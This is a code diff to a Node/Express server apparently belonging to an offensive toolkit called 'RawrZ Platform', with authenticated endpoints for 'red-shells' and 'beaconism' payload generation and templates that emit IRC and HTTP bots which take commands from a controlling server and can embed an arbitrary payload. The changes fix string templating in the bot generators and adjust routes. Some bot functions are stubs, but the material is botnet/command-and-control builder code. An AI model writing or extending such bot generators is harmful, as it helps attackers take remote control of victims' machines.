@@ -1229,6 +1229,7 @@ app.use(helmet({
 app.use(express.static('public'));
 
 // Catch-all route for API endpoints that don't exist
+/*
 app.use('/api/*', (req, res) => {
     res.status(404).json({ 
         error: 'API endpoint not found', 
@@ -1236,8 +1237,10 @@ app.use('/api/*', (req, res) => {
         method: req.method 
     });
 });
+*/
 
 // Catch-all route for other non-API endpoints
+/*
 app.use('*', (req, res) => {
     // Only return JSON for API-like requests
     if (req.path.startsWith('/api/') || req.headers.accept?.includes('application/json')) {
@@ -1251,6 +1254,7 @@ app.use('*', (req, res) => {
         res.sendFile(path.join(__dirname, 'public', 'panel.html'));
     }
 });
+*/
 
 // Health check endpoint
 app.get('/health', (_req, res) => {
@@ -4745,12 +4749,9 @@ app.get('/red-shells/list', requireAuth, async (req, res) => {
 // Beaconism endpoints
 app.post('/beaconism/generate', requireAuth, async (req, res) => {
     try {
-        const { type, options = {} } = req.body || {};
-        if (!type) {
-            return res.status(400).json({ error: 'type is required' });
-        }
+        const { options = {} } = req.body || {};
         
-        const result = await realModules.beaconismDLL.generatePayload(type, options);
+        const result = await realModules.beaconismDLL.generatePayload(options);
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
@@ -4991,7 +4992,7 @@ app.post('/openssl/toggle-custom', requireAuth, async (req, res) => {
 
 app.get('/openssl/algorithms', requireAuth, async (req, res) => {
     try {
-        const result = await realModules.opensslManagement.getAvailableAlgorithms();
+        const result = await realModules.opensslManagement.getAllAlgorithms();
         res.json({ success: true, result });
     } catch (e) {
         res.status(500).json({ error: e.message });
@@ -6642,7 +6643,7 @@ class IRCBot {
     // Beaconism integration
     beaconism() {
         // Add beaconism payload here
-        ${payload ? `const payload = '${payload}';` : ''}
+        ${payload ? `const payload = '` + payload + `';` : ''}
         // Execute beaconism functionality
         console.log('Beaconism activated');
     }` : ''}
@@ -6728,16 +6729,16 @@ class IRCBot:
         
         if '001' in line:
             self.connected = True
-            ${features.autoJoin ? f'self.send_command(f"JOIN {self.channel}")' : ''}
+            ${features.autoJoin ? `self.send_command(f"JOIN {self.channel}")` : ''}
         
-        ${features.commandHandler ? '''
+        ${features.commandHandler ? `
         if 'PRIVMSG' in line:
             match = re.match(r':([^!]+)![^@]+@[^\\s]+\\s+PRIVMSG\\s+([^\\s]+)\\s+:(.+)', line)
             if match:
                 user, target, message = match.groups()
-                self.handle_command(user, target, message)''' : ''}
+                self.handle_command(user, target, message)` : ''}
     
-    ${features.commandHandler ? '''
+    ${features.commandHandler ? `
     def handle_command(self, user, target, message):
         command = message.split()[0].lower()
         
@@ -6745,24 +6746,24 @@ class IRCBot:
             self.send_command(f'PRIVMSG {target} :Pong!')
         elif command == '!info':
             self.send_command(f'PRIVMSG {target} :RawrZApp IRC Bot v1.0')
-        ''' + (features.fileTransfer ? '''
+        ` + (features.fileTransfer ? `
         elif command == '!download':
             self.send_command(f'PRIVMSG {target} :File transfer not implemented')
-        ''' : '') + '''
+        ` : '') + `
         else:
-            pass''' : ''}
+            pass` : ''}
     
-    ${advancedOptions.addBeaconism ? f'''
+    ${advancedOptions.addBeaconism ? `
     def beaconism(self):
         # Add beaconism payload here
-        {'payload = "' + payload + '"' if payload else '# No payload provided'}
+        ${payload ? `payload = "` + payload + `"` : '# No payload provided'}
         # Execute beaconism functionality
-        print('Beaconism activated')''' : ''}
+        print('Beaconism activated')` : ''}
     
-    ${advancedOptions.addEncryption ? '''
+    ${advancedOptions.addEncryption ? `
     def encrypt(self, data):
         # Simple encryption implementation
-        return hashlib.sha256(data.encode()).hexdigest()''' : ''}
+        return hashlib.sha256(data.encode()).hexdigest()` : ''}
 
 if __name__ == '__main__':
     bot = IRCBot()
@@ -6944,7 +6945,7 @@ class HTTPBot {
     // Beaconism integration
     beaconism() {
         // Add beaconism payload here
-        ${payload ? `const payload = '${payload}';` : ''}
+        ${payload ? `const payload = '` + payload + `';` : ''}
         // Execute beaconism functionality
         console.log('Beaconism activated');
     }` : ''}
@@ -7054,40 +7055,40 @@ class HTTPBot:
             for command in response['commands']:
                 self.execute_command(command)
     
-    ${features.commandHandler ? '''
+    ${features.commandHandler ? `
     def execute_command(self, command):
         cmd_type = command.get('type', '')
         
         if cmd_type == 'info':
             self.report_to_server()
         elif cmd_type == 'screenshot':
-            ''' + (features.screenshot ? 'self.take_screenshot()' : 'pass') + '''
-        ''' + (features.fileTransfer ? '''
+            ` + (features.screenshot ? 'self.take_screenshot()' : 'pass') + `
+        ` + (features.fileTransfer ? `
         elif cmd_type == 'download':
             # File download functionality
             pass
         elif cmd_type == 'upload':
             # File upload functionality
-            pass''' : '') + '''
+            pass` : '') + `
         else:
-            print(f'Unknown command: {cmd_type}')''' : ''}
+            print(f'Unknown command: {cmd_type}')` : ''}
     
-    ${features.screenshot ? '''
+    ${features.screenshot ? `
     def take_screenshot(self):
         # Screenshot functionality would be implemented here
-        return 'screenshot_data_base64'''' : ''}
+        return 'screenshot_data_base64'` : ''}
     
-    ${advancedOptions.addBeaconism ? f'''
+    ${advancedOptions.addBeaconism ? `
     def beaconism(self):
         # Add beaconism payload here
-        {'payload = "' + payload + '"' if payload else '# No payload provided'}
+        ${payload ? `payload = "` + payload + `"` : '# No payload provided'}
         # Execute beaconism functionality
-        print('Beaconism activated')''' : ''}
+        print('Beaconism activated')` : ''}
     
-    ${advancedOptions.addEncryption ? '''
+    ${advancedOptions.addEncryption ? `
     def encrypt(self, data):
         # Simple encryption implementation
-        return hashlib.sha256(data.encode()).hexdigest()''' : ''}
+        return hashlib.sha256(data.encode()).hexdigest()` : ''}
 
 if __name__ == '__main__':
     bot = HTTPBot()
@@ -7116,7 +7117,7 @@ pause
     return botCode;
 }
 
-app.listen(port, () => {
+app.listen(port, async () => {
     console.log(`[OK] RawrZ Platform server running on port ${port}`);
     console.log(`[INFO] Available engines: ${Object.keys(realModules).length}`);
     console.log(`[INFO] Health check: http://localhost:${port}/health`);
@@ -7124,6 +7125,14 @@ app.listen(port, () => {
     console.log(`[INFO] Available engines: http://localhost:${port}/api/engines/available`);
     console.log(`[INFO] Server URL: ${config.server.baseUrl}`);
     console.log(`[INFO] Default IRC Server: ${config.server.defaultIrcServer}`);
+    
+    // Initialize OpenSSL Management
+    try {
+        await realModules.opensslManagement.initialize();
+        console.log(`[OK] OpenSSL Management initialized successfully`);
+    } catch (error) {
+        console.error(`[ERROR] Failed to initialize OpenSSL Management:`, error.message);
+    }
 });
 
 module.exports = { app, realModules };
